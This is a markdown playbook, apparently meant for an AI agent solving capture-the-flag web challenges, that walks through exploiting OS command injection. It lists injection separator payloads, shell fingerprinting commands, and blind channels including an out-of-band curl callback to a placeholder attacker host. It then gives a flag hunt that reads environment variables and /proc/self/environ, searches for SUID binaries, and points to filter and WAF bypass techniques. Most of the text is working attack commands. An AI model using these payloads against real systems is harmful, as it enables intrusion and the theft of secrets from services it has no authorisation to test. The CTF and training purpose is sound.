# Workflow — the ordered playbook

## 0. Before any probe — the contract

- Read `AGENTS.md` loop rules — 5 probes / 15 min per mechanism
  class, 25 / 45 min whole-challenge
- Record the challenge: `python3 tools/state.py <name> --category web
  --target <url> --challenge-name "<real>" --event "<event>"`
- Classify: `python3 tools/classify.py --record <name>` and
  `python3 tools/chain_match.py --record <name>` BEFORE probing — the
  card may hand you the exact probe

## 1. Confirm an exec sink exists

Send the cheapest discriminating probe — one benign separator + a
deterministic identity command:

```
x;id            — POSIX
x&id            — POSIX+cmd
x%0aid          — newline (survives ;-filters)
x|id            — pipe
x`id`           — backtick
x$(id)          — substitution
x||id           — or
x&&id           — and
```

A `uid=`/`gid=`/`nt authority`/`Windows IP Configuration` fragment in
the response = the class is LIVE. Use `tools/web/cmdi_probe.py
--url ... --param ... --value 'x;id'` for a bounded single-probe run.

## 2. Identify the shell — fingerprint before payloads

- `x;id` → `uid=` → POSIX
- `x&whoami` → `nt authority\` → Windows cmd
- `x;whoami` → same name both OS — check the format
- `x;uname -a` → Linux/Darwin → POSIX
- `x|ver` → `Microsoft Windows` → cmd
- `x;ps` → POSIX `ps`; PS `Get-Process` — output shape decides
- `x;ls` vs `x;dir` vs `x;type` — the alias tables

## 3. Blind? — pick the channel

- `x;sleep 5` → measure response time — `blind-cmdi.md`
- `x;curl http://YOU/x` → callback — `oob-exfil.md`
- `x;echo x > /tmp/o` → `?f=/tmp/o` read — file-write-then-fetch
- `x;$(cat /flag)` → command-not-found error reflects the output —
  error-channel

## 4. Read the flag — the deterministic hunt

```
cat /flag /flag.txt flag* 2>/dev/null
find / -name '*flag*' -type f 2>/dev/null | head
env | grep -i flag
ls -la / /app /var/www /root /home /tmp 2>/dev/null
grep -r 'flag{' /app /var/www / 2>/dev/null | head
sudo -l; find / -perm -4000 2>/dev/null; getcap -r / 2>/dev/null
cat /proc/self/environ; cat /root/flag 2>/dev/null
```

## 5. Filter blocked? — bypass ladder

- which char blocked → `char-restriction.md` ladder (`${IFS}`/`%0a`/`*`/`$@`)
- which keyword → `keyword-filter.md` (`c'a't`/`$(tr)`/`$@`/wildcard)
- quoting in the way → `quoting.md` (`'`/`"` break-out)
- WAF in front → `waf-bypass.md`
- argv-boundary → `argument-injection.md`

## 6. Verify — the gate

```
python3 tools/hooks.py pre-probe <challenge> --request '<probe>' --hypothesis-id <id> --class command-injection
<run the probe — curl/http_probe/cmdi_probe>
python3 tools/hooks.py post-probe <challenge> \
  --hypothesis-id <id> --class command-injection \
  --verdict confirms --evidence-kind class \
  --evidence 'uid=33(www-data)' --response '<the verbatim bytes>'
python3 tools/hooks.py pre-flag <challenge> --value 'flag{...}'
python3 tools/hooks.py post-probe ... --verdict confirms --evidence-kind impact --evidence 'flag{...}' --response '...'
```

## 7. Escalate — when the budget runs out

`python3 tools/decide.py <name>` → `escalate` →
`python3 tools/state.py <name> --strategy-used chain_match` etc. —
the rungs: chain_match → reclassify → writeup_search → novel_plan →
fanout_sweep → solver_handoff.

## 8. Record — before you move on

- `python3 tools/state.py <name> --hypothesis 'shell injection via ; in host param'`
- verbatim response excerpts — `--evidence` is a substring check
- note the shell (POSIX/cmd/PS), the channel (stdout/time/oob), the
  separator that worked

## The loop summary

```
classify → chain_match → probe(;id) → fingerprint shell
  → [blind?→channel] → [filter?→bypass] → read flag
  → pre-flag → post-probe confirms → classify_solve
```

## Falsifiers

- every separator inert + every eval marker literal → class dead —
  park the hypothesis, record the kill in `knowledge/attempts/`
